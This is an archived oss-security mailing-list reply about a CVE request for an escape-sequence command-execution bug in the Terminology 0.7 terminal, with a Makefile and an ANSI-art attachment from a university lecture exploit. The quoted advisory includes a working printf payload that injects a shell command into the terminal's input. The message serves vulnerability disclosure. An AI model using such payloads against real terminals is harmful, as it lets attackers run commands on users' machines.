X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["37493" "Friday" "4" "November" "2016" "19:57:53" "+0100" "Nicolas Braud-Santoni" "nicolas@braud-santoni.eu" "<20161104185753.ooimqlixnllmxwdd@harbard.iaik.tugraz.at>" "861" "[oss-security] Re: CVE request: Escape Sequence Command Execution vulnerability in Terminology 0.7" nil nil nil "11" "2016110418:57:53" "[oss-security] Re: CVE request: Escape Sequence Command Execution vulnerability in Terminology 0.7" (number mark "U       nicolas@brau Nov  4  861/37493 " thread-indent "\"[oss-security] Re: CVE request: Escape Sequence Command Execution vulnerability in Terminology 0.7\"\n") "<20161104165959.zifap46bmaxapmda@harbard.iaik.tugraz.at>" ("<20161104145429.db6u5xid4wc7cyjn@harbard.iaik.tugraz.at>" "<20161104160820.dazfzwdoureewh2v@eldamar.local>" "<20161104165959.zifap46bmaxapmda@harbard.iaik.tugraz.at>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23887 invoked by uid 550); 4 Nov 2016 19:14:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1492 invoked from network); 4 Nov 2016 18:58:09 -0000
Date: Fri, 4 Nov 2016 19:57:53 +0100
From: Nicolas Braud-Santoni <nicolas@braud-santoni.eu>
To: oss-security@lists.openwall.com
Cc: johannes.winter@iaik.tugraz.at
Message-ID: <20161104185753.ooimqlixnllmxwdd@harbard.iaik.tugraz.at>
References: <20161104145429.db6u5xid4wc7cyjn@harbard.iaik.tugraz.at>
 <20161104160820.dazfzwdoureewh2v@eldamar.local>
 <20161104165959.zifap46bmaxapmda@harbard.iaik.tugraz.at>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="pkxg2odm7psetm3k"
Content-Disposition: inline
In-Reply-To: <20161104165959.zifap46bmaxapmda@harbard.iaik.tugraz.at>
X-Clacks-Overhead: GNU Terry Pratchett
User-Agent: NeoMutt/20161014 (1.7.1)
Subject: [oss-security] Re: CVE request: Escape Sequence Command Execution vulnerability in
 Terminology 0.7

--pkxg2odm7psetm3k
Content-Type: multipart/mixed; boundary="hdilzpeu6srm22ad"
Content-Disposition: inline


--hdilzpeu6srm22ad
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

PS: Ascii-art lovers might prefer the enclosed exploit,
    which we wrote for our infosec lecture in Winter 2015
    at Graz University of Technology.

On Fri, Nov 04, 2016 at 05:59:59PM +0100, Nicolas Braud-Santoni wrote:
> Hi,
>=20
> Terminology 0.7.0 suffers from a bug similar to CVE-2003-0063, where an
> attacker able to print character escape sequences can modify the window
> title and then insert it back in the terminal's input buffer, resulting
> in arbitrary terminal input, including code execution as a local user.
>=20
> A concrete attack scenario can work as follows: the attacker gets a
> string triggering the vulnerability into a log file (or any other thing
> that eventually gets displayed to the user).  When it is, at some later
> point, displayed to the user, "echo 'evil'\n" gets written to the user's
> terminal's input buffer, resulting in that command being executed by the
> user's shell.
>=20
> For example:
>=20
> > printf "\e]2;echo 'evil'\n\a\e]2;?\a"
>=20
>=20
> The issue was fixed in Terminology by
> commit b80bedc7c21ecffe99d8d142930db696eebdd6a5 :
>=20
>   https://git.enlightenment.org/apps/terminology.git/commit/?id=3Db80bedc=
7c21ecffe99d8d142930db696eebdd6a5
>=20
> I would like to apply for a CVE number for this issue,
> on behalf of the Debian security team.
>=20
>=20
> Best regards,
>=20
>   Nicolas Braud-Santoni



--hdilzpeu6srm22ad
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename=Makefile

#
# Magic ELF mockery ahead ...
#

# Clang as assembler frontend
AS :=  clang -fno-integrated-as

# Assembler flags
ASFLAGS := -nostartfiles -Wl,-Ttext=0x0C0DD000 -x assembler-with-cpp

# Objcopy (for extraction)
OC := objcopy

# Objcopy flags
OCFLAGS := -Obinary -j.exploit

# The source files
AS_SOURCES := $(wildcard *.S)

# The intermediate "objects"
OBJECTS := $(AS_SOURCES:%.S=%.obj)

# The resulting ELF images (extracted)
EXECUTABLES := $(OBJECTS:%.obj=%.elf)

#----------------------------------------------------------------------
all: $(EXECUTABLES)

clean:
	-rm -f $(EXECUTABLES) $(OBJECTS)

# Assembler invocation
%.obj: %.S
	$(AS) -o$@ $(ASFLAGS) $<

# ELF image extraction
%.elf: %.obj
	$(OC) $(OCFLAGS) $< $@

terminalbug.obj: ASFLAGS += -DTERMINOLOGY -DXTERM

--hdilzpeu6srm22ad
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="marvin.txt"
Content-Transfer-Encoding: quoted-printable

=1B[0;5;37;47m                              ... :: ...... .. . .. .       =
=1B[0m=0D
=1B[0;5;37;47m  .  . .  .  . .  .  . .  .  . ...  .    . .. . .   .  .  . =
=1B[0m=0D
=1B[0;5;37;47m   .       .       .       .  : ... ...::t;....  .  .    .  =
=1B[0m=0D
=1B[0;5;37;47m     .  .    .  .    .  .     : ...=1B[0;1;37;47mt=1B[0;1;30;=
47mX8=1B[0;1;30;45m8=1B[0;33;41m8=1B[0;1;30;45m8=1B[0;1;30;41m8=1B[0;31;45m=
8=1B[0;5;33;40m.=1B[0;1;30;47m8=1B[0;5;37;47m8% . . .  .    =1B[0m=0D
=1B[0;5;37;47m .       .       .       .  . ...:=1B[0;1;30;47m8=1B[0;35;41m=
@=1B[0;5;31;41m8=1B[0;35;41m8=1B[0;33;41m8=1B[0;31;45m8=1B[0;1;30;43m8=1B[0=
;1;30;45m8=1B[0;1;31;43m8=1B[0;1;30;45m8=1B[0;5;31;41m8=1B[0;5;35;40mS=1B[0=
;1;37;47m =1B[0;5;37;47m: . . .    . =1B[0m=0D
=1B[0;5;37;47m   .  .  . ..... ........ .%8X;S=1B[0;1;37;47m8=1B[0;1;30;47m=
8=1B[0;1;31;41m8=1B[0;5;35;40m@=1B[0;5;33;40m:=1B[0;1;37;47m ;=1B[0;5;37;47=
mS.  ;=1B[0;1;30;47m;=1B[0;1;31;41mX=1B[0;5;35;40mt=1B[0;1;30;47m@=1B[0;5;3=
7;47m.. .:   .   =1B[0m=0D
=1B[0;5;37;47m  .    . .  .  . ..... ;=1B[0;1;37;47mt=1B[0;1;30;47m8=1B[0;1=
;30;45m8=1B[0;1;31;41m8=1B[0;5;31;40m8=1B[0;35;41m8=1B[0;5;31;40mS=1B[0;1;3=
1;41m@=1B[0;5;35;40m8=1B[0;1;31;41m@=1B[0;1;30;41m8X=1B[0;1;30;47m8=1B[0;5;=
37;47m8=1B[0;1;37;47m =1B[0;1;35;47mS=1B[0;5;33;41mX=1B[0;5;37;40m%=1B[0;1;=
30;45m8=1B[0;1;33;47mS=1B[0;5;37;47mS8=1B[0;5;35;40mS=1B[0;1;31;41m@=1B[0;1=
;30;47m8=1B[0;5;37;47m8; .     . =1B[0m=0D
=1B[0;5;37;47m    .   . .. ... ....=1B[0;1;37;47m@=1B[0;1;30;47m8=1B[0;35;4=
1m8=1B[0;5;31;40mX8=1B[0;5;33;40mX=1B[0;5;35;40m8=1B[0;1;30;41m8=1B[0;1;31;=
41m8=1B[0;1;30;45m8=1B[0;33;41mX=1B[0;35;41m@=1B[0;1;30;41m8=1B[0;35;41mX=
=1B[0;1;31;41m8=1B[0;35;41mX=1B[0;5;31;41m8=1B[0;35;41m%=1B[0;33;41mX=1B[0;=
1;30;45m8=1B[0;1;33;47m%=1B[0;35;47m%8=1B[0;1;30;43m8=1B[0;5;37;47m t=1B[0;=
1;37;47m =1B[0;35;41m8=1B[0;5;33;40m%=1B[0;1;37;47m =1B[0;5;37;47m:   .    =
=1B[0m=0D
=1B[0;5;37;47m  .   .  .  . =1B[0;1;37;47m.=1B[0;5;35;40m  =1B[0;1;37;47m;=
=1B[0;5;37;47mX=1B[0;1;37;47m@=1B[0;5;35;40m.=1B[0;1;31;41m8=1B[0;31;45m8=
=1B[0;33;41m8=1B[0;5;35;40mX=1B[0;5;31;40m8=1B[0;1;30;40m8=1B[0;5;31;40m8=
=1B[0;5;30;40m@=1B[0;5;31;40m8=1B[0;1;30;41mS=1B[0;35;41mX=1B[0;33;41mX=1B[=
0;35;41m8=1B[0;1;30;41m888@=1B[0;5;35;40m8=1B[0;1;30;41m88=1B[0;5;35;40m;=
=1B[0;1;37;47m.=1B[0;5;37;47m@=1B[0;35;47m8=1B[0;1;31;41m8=1B[0;1;37;47mt=
=1B[0;5;37;47m.;=1B[0;1;30;45m8=1B[0;1;31;41m8=1B[0;1;30;47m8=1B[0;5;37;47m=
8.   .  =1B[0m=0D
=1B[0;5;37;47m    .    . .. =1B[0;1;30;47m8=1B[0;5;30;40m@X=1B[0;1;30;40m8=
=1B[0;5;31;40m8=1B[0;31;45m@=1B[0;5;31;41m8=1B[0;5;35;40mt=1B[0;1;30;41m8=
=1B[0;35;41mX=1B[0;1;30;41m8=1B[0;31;40mS=1B[0;1;30;40m@=1B[0;34;40m@=1B[0;=
5;30;40m8=1B[0;1;30;40m8=1B[0;35;41mX=1B[0;1;30;41m8=1B[0;35;41m8=1B[0;1;30=
;41m8=1B[0;5;31;40m8=1B[0;5;30;40mS@=1B[0;1;30;40m@88=1B[0;5;31;40m8=1B[0;3=
5;41mX=1B[0;1;31;41m8=1B[0;5;33;40m;=1B[0;5;37;47mX=1B[0;5;35;40m%=1B[0;1;3=
1;41mX=1B[0;1;37;47m8=1B[0;5;37;47m .=1B[0;5;33;40m =1B[0;1;30;41m8=1B[0;35=
;47m8=1B[0;5;37;47m; : . .=1B[0m=0D
=1B[0;5;37;47m  .    . .   .=1B[0;1;37;47m8=1B[0;5;31;40mS=1B[0;1;30;40m8=
=1B[0;30;41m8=1B[0;5;31;40mX8=1B[0;1;30;41m8X=1B[0;35;41mS=1B[0;1;30;41m@8X=
=1B[0;5;31;40m8=1B[0;32;40mt=1B[0;1;30;40m88=1B[0;5;30;40m8=1B[0;1;30;41m@X=
8=1B[0;1;30;40mX=1B[0;34;40mX=1B[0;1;30;40m888=1B[0;34;40m%=1B[0;5;31;40m8=
=1B[0;1;30;41m8=1B[0;5;31;40m8=1B[0;1;30;41m8=1B[0;1;30;47mS=1B[0;1;37;47m =
=1B[0;1;30;41m8=1B[0;5;35;40m =1B[0;5;37;47m.::=1B[0;5;33;40mt=1B[0;1;31;41=
m8=1B[0;1;30;47mt=1B[0;5;37;47m:.. . =1B[0m=0D
=1B[0;5;37;47m     .   . . ..:S=1B[0;5;35;40m.=1B[0;35;41m@=1B[0;1;30;41m8S=
XXSS=1B[0;30;41mX@=1B[0;5;31;40m8=1B[0;31;40mt=1B[0;34;40mS=1B[0;31;40mX=1B=
[0;30;41m8=1B[0;5;31;40m8=1B[0;34;40mt=1B[0;1;30;40mX=1B[0;31;40m@=1B[0;1;3=
0;40m8@=1B[0;31;40m@=1B[0;5;31;40m8=1B[0;1;30;41m@=1B[0;1;30;40m8=1B[0;31;4=
0m8=1B[0;5;31;40mX8=1B[0;1;37;47mt=1B[0;5;37;47m8=1B[0;35;41m8=1B[0;5;33;40=
m:=1B[0;5;37;47m8.@=1B[0;5;35;40m%=1B[0;35;41m8=1B[0;1;37;47m;=1B[0;5;37;47=
m:  ..=1B[0m=0D
=1B[0;5;37;47m  .    .   .   .t=1B[0;35;41m8=1B[0;1;30;41m88S=1B[0;30;41m@=
=1B[0;1;30;41m8=1B[0;31;40mS=1B[0;5;31;40mX=1B[0;31;45m8=1B[0;1;30;41m8=1B[=
0;30;41m8=1B[0;1;30;41m8=1B[0;31;40mS=1B[0;1;30;40m8=1B[0;31;40m8=1B[0;30;4=
1m88=1B[0;1;30;40m8=1B[0;34;40mS=1B[0;31;40mX=1B[0;1;30;40m@=1B[0;31;40m@=
=1B[0;1;30;41m8=1B[0;30;41mS=1B[0;1;30;41m8=1B[0;34;40mX=1B[0;1;30;40m8=1B[=
0;1;30;41m8=1B[0;5;35;40mS=1B[0;5;37;47m =1B[0;1;30;47mt=1B[0;1;31;41m8=1B[=
0;1;30;47m8=1B[0;5;37;47mS.=1B[0;1;30;47m8=1B[0;1;31;41m8=1B[0;1;30;47m8=1B=
[0;5;37;47mt.. .=1B[0m=0D
=1B[0;5;37;47m    .   . ......8=1B[0;5;31;40m@=1B[0;1;30;41m@%8=1B[0;5;31;4=
0mS=1B[0;5;35;40mt=1B[0;5;37;40m88=1B[0;1;30;47mt=1B[0;5;37;40m8=1B[0;5;35;=
40m.=1B[0;1;30;40m8=1B[0;30;41m@=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;5;31;40m@=
=1B[0;30;41m@=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;=
1;30;40m8=1B[0;30;41m@=1B[0;1;30;41m8=1B[0;30;41m@=1B[0;1;30;41m8=1B[0;30;4=
1m@=1B[0;1;30;41m88=1B[0;5;37;47m88=1B[0;1;30;41m8=1B[0;35;41m8=1B[0;5;37;4=
7m%:=1B[0;1;37;47m =1B[0;1;30;41m8=1B[0;5;35;40m:=1B[0;5;37;47mt .. =1B[0m=
=0D
=1B[0;5;37;47m . . ... ;  .:=1B[0;1;37;47m =1B[0;5;35;40mt=1B[0;1;31;41m8=
=1B[0;1;30;41m@=1B[0;35;41mX=1B[0;1;30;41mX=1B[0;5;31;40m8=1B[0;5;35;40m.=
=1B[0;1;30;47m@=1B[0;5;37;40m@8=1B[0;1;30;47mt%8=1B[0;5;35;40m =1B[0;1;30;4=
1m8=1B[0;30;41m@=1B[0;35;41m@=1B[0;30;41m8=1B[0;35;41m8=1B[0;30;41m8=1B[0;3=
1;40m88=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;5;30;40mX=1B[0;31;40m@=1B[0;30;41m=
8=1B[0;1;30;41m88=1B[0;35;41m@=1B[0;1;30;41m@=1B[0;5;35;40mS=1B[0;5;37;47m8=
=1B[0;1;30;41m88=1B[0;1;30;47m8=1B[0;1;37;47m =1B[0;1;31;41m8=1B[0;5;35;40m=
@=1B[0;1;30;47m8=1B[0;5;37;47m;   .=1B[0m=0D
=1B[0;5;37;47m. .. .  ....=1B[0;1;30;47mt=1B[0;35;41m8=1B[0;1;31;41mX=1B[0;=
5;31;40m8=1B[0;35;41m8=1B[0;1;30;41m@X=1B[0;30;41m8=1B[0;5;35;40m%=1B[0;5;3=
3;40m =1B[0;5;36;40mX=1B[0;1;30;40m88=1B[0;5;36;40mS=1B[0;5;37;40m8=1B[0;1;=
30;47m8=1B[0;5;37;40m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;1;30;4=
1m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;5;31;40mS=1B[0;5;35;40m8  =1B[0;5;37;4=
0m8=1B[0;5;35;40m;@=1B[0;30;41m8=1B[0;5;31;40m8=1B[0;1;30;41m8%=1B[0;1;31;4=
1m%=1B[0;1;30;41m8=1B[0;35;41m@=1B[0;1;30;41m8=1B[0;1;31;41m8=1B[0;5;35;40m=
@=1B[0;1;30;41m8=1B[0;1;30;47m8=1B[0;5;37;47m8 ... =1B[0m=0D
=1B[0;5;37;47m. . .. . .=1B[0;1;37;47m;=1B[0;5;35;40mX=1B[0;1;31;41mS=1B[0;=
5;31;40m8=1B[0;1;30;41m8=1B[0;35;41mS=1B[0;1;30;41mXSX=1B[0;30;41m8=1B[0;5;=
31;40m8=1B[0;5;36;40m =1B[0;5;30;40m8=1B[0;1;30;40m@=1B[0;34;40m8=1B[0;5;30=
;40m8=1B[0;5;35;40m:=1B[0;1;30;47m8=1B[0;5;37;40mX=1B[0;1;30;41m8=1B[0;30;4=
1m8=1B[0;35;41m8=1B[0;31;40m8=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;5;35;40m =1B=
[0;1;30;47m8=1B[0;5;37;40m8@=1B[0;5;35;40m =1B[0;1;30;47m8=1B[0;5;37;40m@=
=1B[0;5;35;40m =1B[0;1;30;41m888=1B[0;5;35;40m =1B[0;5;37;40m%=1B[0;33;41m@=
=1B[0;31;45m8=1B[0;5;37;40m@=1B[0;1;37;47m:=1B[0;5;37;47mX;  ... =1B[0m=0D
=1B[0;5;37;47m . . t=1B[0;1;37;47mt=1B[0;1;30;47mS=1B[0;5;37;40m@%=1B[0;1;3=
1;41m@=1B[0;1;30;41m88S%S=1B[0;35;41m%=1B[0;1;30;41mS=1B[0;35;41m%=1B[0;30;=
41mX=1B[0;1;30;41mX=1B[0;5;31;40m8=1B[0;5;30;40mX=1B[0;5;31;40m@=1B[0;5;30;=
40mX=1B[0;5;36;40mt=1B[0;5;35;40m  8=1B[0;31;40m8=1B[0;30;41m@=1B[0;1;30;41=
m8=1B[0;30;41mX=1B[0;1;30;41m8=1B[0;5;35;40m%=1B[0;5;37;40m8=1B[0;5;35;40m =
=1B[0;5;34;40mS=1B[0;5;30;40m@=1B[0;5;35;40mX=1B[0;5;30;40m8=1B[0;5;36;40m =
=1B[0;1;30;47m8=1B[0;5;31;40m@=1B[0;30;41mX=1B[0;5;35;40mt=1B[0;1;30;47mX=
=1B[0;5;31;41m8=1B[0;5;35;40mX=1B[0;33;41mX=1B[0;1;30;47m8S@%=1B[0;1;37;47m=
 t=1B[0;5;37;47m8;..=1B[0m=0D
=1B[0;5;37;47m.X=1B[0;1;37;47mS=1B[0;5;37;40m;=1B[0;35;41m8=1B[0;1;30;41m88=
S=1B[0;35;41mS=1B[0;33;41mX=1B[0;35;41m8=1B[0;1;31;41m@=1B[0;35;41m8=1B[0;1=
;31;41mS=1B[0;35;41m@=1B[0;1;30;41mX=1B[0;35;41mt=1B[0;30;41mS=1B[0;1;30;41=
m8=1B[0;30;41mX88=1B[0;31;40m8=1B[0;5;31;40m88=1B[0;5;30;40m8=1B[0;1;30;41m=
8=1B[0;35;41mS=1B[0;30;41m%=1B[0;35;41mS=1B[0;30;41m@88=1B[0;1;30;41m8=1B[0=
;5;35;40m8=1B[0;5;37;40mX=1B[0;5;35;40m;=1B[0;1;30;40m@=1B[0;5;30;40m8@=1B[=
0;5;33;40m%=1B[0;5;36;40m =1B[0;5;35;40m.=1B[0;1;30;41m88=1B[0;30;41m@=1B[0=
;1;30;41m88%@=1B[0;35;41m8=1B[0;33;41m8=1B[0;5;31;40mX8=1B[0;5;30;40m8=1B[0=
;5;31;40m8=1B[0;5;30;40m@=1B[0;5;33;40m;=1B[0;1;30;47m8=1B[0;5;37;47mX=1B[0=
m=0D
=1B[0;5;37;47m.=1B[0;1;30;47m;=1B[0;1;30;41m8=1B[0;5;31;40m8=1B[0;1;30;41m8=
8XX@=1B[0;35;41m@=1B[0;1;31;41m8=1B[0;1;30;45m8=1B[0;5;31;41m8=1B[0;1;30;41=
m8S=1B[0;35;41mt=1B[0;30;41mX=1B[0;1;30;41m8=1B[0;30;41mX=1B[0;1;30;41m8=1B=
[0;31;40m@=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;34;40mX=1B[0;30;41m8@X=1B[0;1;3=
0;41m8X=1B[0;30;41mS=1B[0;35;41m8=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;30;41m8=
=1B[0;31;40m8=1B[0;5;35;40m:=1B[0;5;33;40m :=1B[0;5;30;40mX=1B[0;5;31;40mX=
=1B[0;5;35;40m@=1B[0;5;31;40mX=1B[0;30;41m@X=1B[0;1;30;41m8=1B[0;31;40m8=1B=
[0;1;30;41m8=1B[0;1;30;40m8=1B[0;1;30;41m@=1B[0;5;30;40m8=1B[0;1;30;41m8=1B=
[0;1;30;45m8=1B[0;5;31;40m8=1B[0;5;30;40m88=1B[0;1;30;40mX=1B[0;5;30;40m8=
=1B[0;5;31;40mX=1B[0;5;30;40mX=1B[0;1;30;47m =1B[0m=0D
=1B[0;5;37;47m.=1B[0;1;30;47mX=1B[0;5;31;40m@=1B[0;5;30;40m8=1B[0;1;30;41m@=
@8S=1B[0;35;41m@=1B[0;5;31;41m8=1B[0;31;45m8=1B[0;5;31;41m8=1B[0;35;41mX=1B=
[0;1;31;41m@=1B[0;35;41mX=1B[0;1;30;41mX=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;3=
1;40m88=1B[0;30;41m8=1B[0;35;41m8=1B[0;30;41m88=1B[0;31;40m8=1B[0;35;41m8=
=1B[0;30;41m@=1B[0;35;41mS=1B[0;30;41m%=1B[0;1;30;41m8=1B[0;30;41mX=1B[0;35=
;41mX=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;5;31;40m=
@@@=1B[0;1;30;40m@=1B[0;1;30;41m@=1B[0;31;40m8=1B[0;1;30;41m8=1B[0;30;41m8=
=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;35;41mS=1B[0;1;30;41mSX@S@=
88=1B[0;5;31;40mX=1B[0;1;30;40m8@=1B[0;5;34;40m@=1B[0;1;30;47m8=1B[0m=0D
=1B[0;5;37;47m.=1B[0;1;30;47m;=1B[0;5;30;40m8=1B[0;1;30;40m88=1B[0;31;40m8=
=1B[0;31;45m8=1B[0;1;31;41m8=1B[0;31;45m8=1B[0;5;31;41m8=1B[0;1;30;41m8=1B[=
0;1;31;41mS=1B[0;35;41m@=1B[0;1;30;41m8=1B[0;35;41m%=1B[0;5;31;40m8=1B[0;1;=
37;47m8=1B[0;5;37;47mX=1B[0;5;35;40m@=1B[0;1;30;41m8=1B[0;31;40mX8=1B[0;1;3=
0;41m8=1B[0;30;41m8=1B[0;5;31;40m@=1B[0;31;40mX=1B[0;1;30;41m8=1B[0;30;41m8=
=1B[0;35;41mS=1B[0;30;41m8XX=1B[0;35;41mX=1B[0;30;41m8=1B[0;31;40m8=1B[0;30=
;41m88888=1B[0;31;40m8=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;1;30;41m8=1B[0;30;4=
1m@=1B[0;35;41m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;5;35;40mS=1B[0;5;31;40m8=
=1B[0;30;41m8=1B[0;1;30;41m@88=1B[0;1;30;40m88=1B[0;5;30;40m8@8=1B[0;1;37;4=
7m8=1B[0m=0D
=1B[0;5;37;47m..=1B[0;1;37;47m;=1B[0;5;35;40m =1B[0;31;45m8=1B[0;1;30;43m8=
=1B[0;5;31;41m8=1B[0;1;30;45m8=1B[0;5;31;41m@=1B[0;1;30;41m8=1B[0;1;31;41m@=
=1B[0;1;30;41m8=1B[0;35;41mS=1B[0;1;31;41mt=1B[0;1;30;41m%=1B[0;1;30;47m;=
=1B[0;5;37;47m  .=1B[0;1;37;47m8=1B[0;5;35;40m%=1B[0;1;30;41m8=1B[0;31;40m8=
=1B[0;30;41m88=1B[0;34;40m@=1B[0;31;40m88=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;=
35;41m8=1B[0;31;40m88=1B[0;1;30;40m8=1B[0;30;41m8=1B[0;5;31;40m@=1B[0;30;41=
m@=1B[0;1;30;41m8=1B[0;31;40m8=1B[0;5;30;40mX=1B[0;31;40m@=1B[0;30;41m8=1B[=
0;35;41m8=1B[0;31;40m8=1B[0;35;41m8=1B[0;1;30;41m88=1B[0;30;41m%=1B[0;5;35;=
40m.=1B[0;1;37;47m%=1B[0;1;30;47mt=1B[0;5;33;40m =1B[0;5;31;40m8=1B[0;5;35;=
40mS=1B[0;5;33;40m =1B[0;5;35;40m =1B[0;5;37;40m8=1B[0;1;30;47mX=1B[0;5;37;=
47m@.=1B[0m=0D
=1B[0;5;37;47m . t=1B[0;5;35;40m:=1B[0;5;31;41m%=1B[0;31;45m@=1B[0;5;31;41m=
@=1B[0;35;41m888%=1B[0;1;30;41m@=1B[0;35;41mS=1B[0;1;30;41mX=1B[0;5;37;47m8=
. .  =1B[0;1;37;47mX=1B[0;5;35;40mt=1B[0;5;31;40mX=1B[0;30;41mX=1B[0;1;30;4=
1m8=1B[0;1;30;40m8=1B[0;31;40m8=1B[0;34;40m@=1B[0;31;40mS=1B[0;1;30;40mX=1B=
[0;31;40mX=1B[0;5;31;40m8=1B[0;30;41m888=1B[0;31;40m88=1B[0;1;30;41m8=1B[0;=
31;40mX8=1B[0;5;35;40m =1B[0;1;37;47m;=1B[0;5;35;40m8=1B[0;1;30;41m%=1B[0;3=
0;41mX=1B[0;35;41m@=1B[0;1;30;41mS%=1B[0;5;31;40m8=1B[0;5;30;40m8=1B[0;1;30=
;41mX=1B[0;35;41mX=1B[0;1;30;41m8=1B[0;1;30;47m%=1B[0;1;37;47mtS=1B[0;5;37;=
47m: .=1B[0m=0D
=1B[0;5;37;47m.. .=1B[0;1;37;47m.=1B[0;31;45m8=1B[0;1;31;41m8=1B[0;5;33;40m=
8=1B[0;5;31;41m8=1B[0;35;41m@=1B[0;33;41m@=1B[0;35;41m@=1B[0;1;30;41mS=1B[0=
;35;41mS=1B[0;5;35;40mS=1B[0;5;37;47m:.. ..  =1B[0;1;37;47mt=1B[0;31;40m@8=
=1B[0;1;30;41m88=1B[0;30;41m@=1B[0;1;30;41m8=1B[0;30;41m888=1B[0;1;30;41m8=
=1B[0;31;40m8=1B[0;5;35;40m8=1B[0;31;40m8=1B[0;30;41m88=1B[0;5;34;40mS=1B[0=
;5;35;40mX=1B[0;5;37;47m;;t=1B[0;5;35;40m%=1B[0;1;30;41mSSS8=1B[0;30;41m@=
=1B[0;5;31;40mX=1B[0;1;30;40m@=1B[0;5;30;40m8=1B[0;1;30;47m8=1B[0;5;31;41m@=
=1B[0;1;30;45m8=1B[0;1;30;47m8=1B[0;5;37;47m;: =1B[0m=0D
=1B[0;5;37;47m. ..t=1B[0;5;33;40mS=1B[0;35;41m8=1B[0;1;31;41m8=1B[0;35;41m8=
=1B[0;33;41m8=1B[0;35;41m8=1B[0;1;31;41mX=1B[0;1;30;41m8=1B[0;1;31;41mS=1B[=
0;1;30;47m8=1B[0;5;37;47m:..  .. .=1B[0;1;30;47m.=1B[0;1;30;41m8=1B[0;30;41=
m8X=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;5;31;40m@=1B[0;31;40mX=1B[0;34;40mX=1B=
[0;30;41m8=1B[0;5;30;40m@=1B[0;30;41m8=1B[0;5;35;40m8@.=1B[0;1;37;47m =1B[0=
;5;37;47m...8=1B[0;1;31;41mS=1B[0;35;41m@S=1B[0;1;30;41mX=1B[0;35;41mX=1B[0=
;1;30;41mS=1B[0;5;30;40m8=1B[0;31;40m8=1B[0;5;31;40m8=1B[0;5;30;40mX=1B[0;1=
;30;47m;=1B[0;5;37;47m8; ..=1B[0m=0D
=1B[0;5;37;47m :. :%=1B[0;1;30;47m%88=1B[0;1;35;47mS=1B[0;33;47m8=1B[0;35;4=
1m8=1B[0;1;30;41m8=1B[0;1;30;47mS=1B[0;5;37;47mt . ... .::=1B[0;5;35;40m.=
=1B[0;35;41m@=1B[0;1;30;41m8=1B[0;30;41m8=1B[0;1;30;41m8=1B[0;5;37;40m8=1B[=
0;1;37;47mS=1B[0;5;37;47m8=1B[0;1;37;47m8=1B[0;5;37;47mS:t:.. :8=1B[0;35;41=
m8=1B[0;1;31;41m8=1B[0;35;41m8=1B[0;5;31;41m8=1B[0;35;41m8=1B[0;1;31;41m8=
=1B[0;31;45m8=1B[0;1;30;41m8=1B[0;5;30;40m@=1B[0;1;30;40m8=1B[0;5;30;40m88=
=1B[0;5;33;40mt=1B[0;5;37;47mS:..=1B[0m=0D
=1B[0;5;37;47m      .::::      .     . =1B[0;5;35;40m:=1B[0;1;30;41mSS88=1B=
[0;5;37;47m      . .: :=1B[0;5;33;40m.=1B[0;5;31;41m8=1B[0;31;45m8=1B[0;5;3=
1;41m8=1B[0;5;35;40mX=1B[0;5;31;41m8=1B[0;31;45m8=1B[0;5;31;41m8=1B[0;1;30;=
45m8=1B[0;1;30;41mX=1B[0;5;30;40m8=1B[0;1;30;40m8=1B[0;5;30;40m8=1B[0;5;31;=
40m@=1B[0;5;35;40m =1B[0;5;37;47m  .=1B[0m=0D
=1B[0;5;37;47m   . .                 . =1B[0;5;35;40mt=1B[0;1;31;41mS=1B[0;=
5;31;40m8=1B[0;1;30;41mS=1B[0;5;35;40mt=1B[0;5;37;47m        .  =1B[0;1;37;=
47m:=1B[0;5;31;41m8=1B[0;5;35;40m8=1B[0;5;31;41m8=1B[0;1;30;41m8=1B[0;5;31;=
41m@=1B[0;31;45m8=1B[0;5;31;41m8=1B[0;5;31;40mS=1B[0;5;31;41mX=1B[0;1;30;45=
m8=1B[0;1;30;41m@=1B[0;1;30;40m8=1B[0;5;31;40m8=1B[0;5;30;40m8=1B[0;1;37;47=
m@=1B[0;5;37;47m  .=1B[0m=0D
=1B[0;5;37;47m .     .       .  . .   ;=1B[0;5;35;40m;=1B[0;1;31;41mX=1B[0;=
5;31;40m8=1B[0;35;41m@=1B[0;1;30;47m8=1B[0;5;37;47m:    .   . t=1B[0;5;35;4=
0m:=1B[0;1;31;41mS=1B[0;5;35;40mX=1B[0;5;31;41m8=1B[0;1;30;45m8=1B[0;5;31;4=
1m8=1B[0;35;41m8=1B[0;5;31;41mS=1B[0;31;45m8=1B[0;1;31;41m8=1B[0;5;33;40m%=
=1B[0;5;31;40mX=1B[0;5;36;40mt=1B[0;1;37;47m8=1B[0;5;37;47m .  =1B[0m=0D
